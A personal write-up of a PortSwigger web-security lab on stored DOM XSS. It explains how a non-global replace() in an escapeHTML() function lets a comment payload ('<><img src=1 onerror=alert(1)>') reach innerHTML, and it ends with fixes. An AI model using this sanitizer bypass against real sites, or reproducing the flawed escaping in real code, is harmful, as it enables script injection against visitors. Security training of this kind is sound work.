@@ -1,0 +1,67 @@
+================================
+LAB: Stored DOM XSS
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-26
+Lab URL: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
+Category: Cross-Site Scripting (XSS) - DOM-based
+Level: Apprentice
+Objective: Exploit a stored DOM XSS vulnerability in the blog comment functionality to call alert().
+Description: The blog comment section stores user input server-side, then retrieves it via XHR and renders it client-side using innerHTML — creating a DOM XSS sink.
+
+[RECONNAISSANCE]
+----------------
+- Blog post page loads comments dynamically via XHR GET request to /post/comment endpoint
+- Response is JSON array of comment objects: { avatar, website, date, body, author }
+- Client-side JS function loadComments() fetches and passes data to displayComments()
+- displayComments() uses innerHTML to insert comment.author and comment.body into the DOM
+
+Key JS sink identified:
+  let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+  firstPElement.innerHTML = newInnerHtml
+
+  commentBodyPElement.innerHTML = escapeHTML(comment.body)
+
+escapeHTML() function:
+  return html.replace('<', '&lt;').replace('>', '&gt;');
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+escapeHTML() uses String.replace() without a global regex flag (/g).
+Result: only the FIRST occurrence of '<' and '>' is escaped.
+Any subsequent angle brackets in the input pass through unmodified.
+The sanitized string is then assigned directly to innerHTML — a dangerous sink.
+
+[EXPLOITATION]
+--------------
+Payload: <><img src=1 onerror=alert(1)>
+
+Mechanism:
+  - escapeHTML() escapes the first '<>' pair → &lt;&gt;
+  - The second pair '<img src=1 onerror=alert(1)>' is untouched
+  - innerHTML receives: &lt;&gt;<img src=1 onerror=alert(1)>
+  - Browser parses <img>, src=1 fails to load, onerror fires → alert(1) executes
+
+Steps:
+  1. Navigate to any blog post
+  2. Submit a comment with the payload in the body field:
+     <><img src=1 onerror=alert(1)>
+  3. Reload the page — comment is loaded via XHR and rendered into the DOM
+  4. alert(1) triggers on page load
+
+[EVIDENCE]
+----------
+Comment stored in JSON response:
+  {"body":"<><img src=1 onerror=alert(1)>\r\n","author":"sam","date":"2026-02-26T15:53:24Z","avatar":"","website":""}
+
+alert(1) fired on page reload — lab marked as solved.
+
+[LESSONS LEARNED]
+-----------------
+- String.replace() without /g only replaces the first match — never use it for security sanitization
+- Correct fix: html.replace(/</g, '&lt;').replace(/>/g, '&gt;')  (global regex)
+- innerHTML is a dangerous sink — prefer textContent for plain text insertion
+- Stored DOM XSS is stealthier than reflected: payload persists and fires for every visitor
+- Even well-intentioned sanitization can be bypassed if implemented incorrectly — always use proven libraries (e.g. DOMPurify)
